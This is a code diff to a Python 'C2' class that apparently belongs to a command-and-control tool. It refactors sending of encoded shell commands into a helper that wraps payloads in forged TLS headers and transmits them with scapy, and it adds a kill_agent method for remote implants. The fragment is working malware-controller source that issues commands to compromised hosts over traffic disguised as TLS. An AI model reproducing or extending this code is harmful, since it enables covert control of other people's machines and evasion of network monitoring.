@@ -65,6 +65,14 @@ class C2:
             self.view.print_error("Could not encode shell command.")
             return False
 
+        return self._send_fake_tls(payload, args)
+
+    def kill_agent(self, args: argparse.Namespace) -> bool:
+        payload = self._generate_payload(args, True)
+
+        return self._send_fake_tls(payload, args)
+
+    def _send_fake_tls(self, payload: bytes, args: argparse.Namespace) -> bool:
         payload_len = struct.pack("!H", len(payload))
 
         tls_header = bytes.fromhex(
@@ -81,10 +89,14 @@ class C2:
             / payload
         )
 
-        if len(packet) > 5000:
+        packet_len = len(packet)
+
+
+        if packet_len > 5000:
             self.view.print_error("Packet size exceeds 5000 bytes. Aborting send.")
             return False
         self.view.print_msg(f"Sending: {packet.summary()}")
+        self.view.print_debug(f"Sending: {packet_len} bytes")
         try:
             send(packet, verbose=False)
             self.view.print_success("Packet sent successfully.")
